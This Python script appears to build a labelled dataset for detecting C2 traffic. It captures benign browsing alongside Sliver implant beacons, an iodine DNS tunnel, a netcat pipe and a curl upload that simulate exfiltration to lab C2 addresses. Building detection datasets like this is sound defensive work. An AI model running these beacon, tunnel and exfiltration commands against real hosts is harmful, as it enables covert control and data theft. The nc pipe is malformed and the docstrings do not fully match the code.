# lab/traffic_gen.py
"""
Automated traffic generation for labeled dataset creation.
Generates both C2 and benign traffic with precise labels.
"""

import subprocess
import time
import random
import csv
import signal
import os
from datetime import datetime
from dataclasses import dataclass
from typing import Optional


@dataclass
class TrafficSession:
    session_id: str
    start_time: float
    end_time: Optional[float]
    label: int          # 0=benign, 1=c2_beacon, 2=dns_tunnel, 3=exfil
    tool: str
    pcap_path: str


class TrafficGenerator:
    """Controls C2 frameworks and benign traffic for labeled data generation."""

    BENIGN_DOMAINS = [
        "google.com", "github.com", "stackoverflow.com",
        "docs.python.org", "ubuntu.com", "cloudflare.com",
        "npmjs.com", "pypi.org", "reddit.com", "wikipedia.org",
    ]

    def __init__(self, c2_server_ip: str = "192.168.100.10",
                 capture_interface: str = "eth0",
                 output_dir: str = "lab/pcaps"):
        self.c2_ip = c2_server_ip
        self.interface = capture_interface
        self.output_dir = output_dir
        os.makedirs(output_dir, exist_ok=True)
        self.sessions = []
        self.current_tcpdump = None

    def start_capture(self, session_id: str, label: int, tool: str) -> TrafficSession:
        """Start a tcpdump capture for this session."""
        pcap_path = f"{self.output_dir}/{session_id}_{tool}.pcap"
        self.current_tcpdump = subprocess.Popen([
            "tcpdump", "-i", self.interface,
            "-w", pcap_path,
            "-q", "--immediate-mode",
        ])
        
        session = TrafficSession(
            session_id=session_id,
            start_time=time.time(),
            end_time=None,
            label=label,
            tool=tool,
            pcap_path=pcap_path,
        )
        self.sessions.append(session)
        return session

    def stop_capture(self, session: TrafficSession):
        """Stop current capture and finalize session."""
        if self.current_tcpdump:
            self.current_tcpdump.send_signal(signal.SIGTERM)
            self.current_tcpdump.wait()
            self.current_tcpdump = None
        session.end_time = time.time()

    # === Benign Traffic ===
    def generate_benign_browsing(self, duration_s: int = 300):
        """Simulate realistic web browsing to build benign baseline."""
        session_id = f"benign_{int(time.time())}"
        session = self.start_capture(session_id, label=0, tool="benign_browsing")
        
        print(f"[Lab] Generating benign traffic for {duration_s}s...")
        end = time.time() + duration_s
        
        while time.time() < end:
            domain = random.choice(self.BENIGN_DOMAINS)
            # curl simulates browser TLS fingerprint better than wget
            subprocess.run([
                "curl", "-s", "-A",
                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
                f"https://{domain}",
                "--max-time", "10",
                "-o", "/dev/null",
            ])
            time.sleep(random.expovariate(1/15))  # Exponential inter-request time
        
        self.stop_capture(session)
        return session

    # === C2 Beaconing ===
    def generate_sliver_beacon(self, beacon_interval_s: int = 60,
                                jitter_pct: int = 20, duration_s: int = 600):
        """
        Generate Sliver C2 beacon traffic.
        Requires: sliver-server running on c2_server_ip with:
          sliver> generate --beacon --mtls {c2_ip} --beacon-interval {interval}s
                           --beacon-jitter {jitter}s --os linux
        """
        session_id = f"sliver_beacon_{beacon_interval_s}s_{int(time.time())}"
        session = self.start_capture(session_id, label=1, tool="sliver")
        
        print(f"[Lab] Sliver beacon: interval={beacon_interval_s}s, "
              f"jitter={jitter_pct}%, duration={duration_s}s")
        
        # Run the generated implant (assumed already generated)
        implant_proc = subprocess.Popen(
            ["./sliver_implant"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
        time.sleep(duration_s)
        implant_proc.terminate()
        
        self.stop_capture(session)
        return session

    # === DNS Tunneling ===
    def generate_iodine_tunnel(self, data_size_kb: int = 1024, duration_s: int = 300):
        """
        Generate iodine DNS tunnel traffic.
        Requires: iodined running on c2_server_ip:
          sudo iodined -f -c 192.168.99.1 tunnel.lab
        """
        session_id = f"iodine_{data_size_kb}kb_{int(time.time())}"
        session = self.start_capture(session_id, label=2, tool="iodine")
        
        print(f"[Lab] iodine DNS tunnel: {data_size_kb}KB over DNS")
        
        # Start iodine tunnel
        iodine_proc = subprocess.Popen([
            "iodine", "-f", "-r", self.c2_ip, "tunnel.lab"
        ])
        time.sleep(5)  # Wait for tunnel
        
        # Transfer data over tunnel
        subprocess.run([
            "dd", "if=/dev/urandom",
            f"bs={data_size_kb*1024}", "count=1",
            f"| nc 192.168.99.1 4444"
        ], shell=True, timeout=duration_s)
        
        iodine_proc.terminate()
        self.stop_capture(session)
        return session

    # === Data Exfiltration ===
    def generate_https_exfil(self, data_size_mb: int = 50, duration_s: int = 120):
        """Simulate HTTPS data exfiltration (large upload to C2)."""
        session_id = f"https_exfil_{data_size_mb}mb_{int(time.time())}"
        session = self.start_capture(session_id, label=3, tool="https_exfil")
        
        print(f"[Lab] HTTPS exfil: {data_size_mb}MB upload")
        
        # Generate random data to simulate exfiltrated documents
        tmp_file = f"/tmp/exfil_data_{session_id}.bin"
        subprocess.run(["dd", "if=/dev/urandom", f"of={tmp_file}",
                        f"bs={data_size_mb}M", "count=1"])
        
        # Upload to C2 server (simulated as HTTPS PUT)
        subprocess.run([
            "curl", "-k", "-X", "POST",
            f"https://{self.c2_ip}:8443/upload",
            "-T", tmp_file,
            "--max-time", str(duration_s),
        ])
        
        os.remove(tmp_file)
        self.stop_capture(session)
        return session

    def build_dataset(self, output_csv: str = "lab/dataset.csv"):
        """Convert all captured PCAPs to labeled feature CSV."""
        import sys
        sys.path.insert(0, ".")
        from lab.dataset_builder import PCAPToDataset
        
        builder = PCAPToDataset()
        all_rows = []
        
        for session in self.sessions:
            if not os.path.exists(session.pcap_path):
                continue
            print(f"[Dataset] Processing {session.pcap_path} (label={session.label})")
            rows = builder.process_pcap(session.pcap_path, session.label)
            all_rows.extend(rows)
        
        import pandas as pd
        df = pd.DataFrame(all_rows)
        df.to_csv(output_csv, index=False)
        print(f"[Dataset] Saved {len(df)} labeled flows to {output_csv}")
        print(df["label"].value_counts())
        return df


class FullLabRunner:
    """Run complete lab data generation pipeline."""
    
    def run(self, target_samples_per_class: int = 5000):
        gen = TrafficGenerator()
        
        print("=== PhantomFlow Lab Data Generation ===")
        
        # 1. Benign baseline (need much more to represent real-world imbalance)
        print("\n[1/4] Benign traffic...")
        for i in range(target_samples_per_class // 300):
            gen.generate_benign_browsing(duration_s=300)
        
        # 2. C2 beaconing with various intervals (10s, 30s, 60s, 120s, 300s)
        print("\n[2/4] C2 beaconing (Sliver)...")
        for interval in [10, 30, 60, 120, 300]:
            for jitter in [0, 10, 20, 30]:
                gen.generate_sliver_beacon(
                    beacon_interval_s=interval,
                    jitter_pct=jitter,
                    duration_s=interval * 20  # 20 beacons per capture
                )
        
        # 3. DNS tunneling
        print("\n[3/4] DNS tunneling (iodine + dnscat2)...")
        for size in [128, 512, 1024, 4096]:
            gen.generate_iodine_tunnel(data_size_kb=size)
        
        # 4. HTTPS exfiltration
        print("\n[4/4] HTTPS exfiltration...")
        for size in [1, 10, 50, 100]:
            gen.generate_https_exfil(data_size_mb=size)
        
        gen.build_dataset("lab/ground_truth_dataset.csv")

if __name__ == "__main__":
    runner = FullLabRunner()
    runner.run(target_samples_per_class=1000)
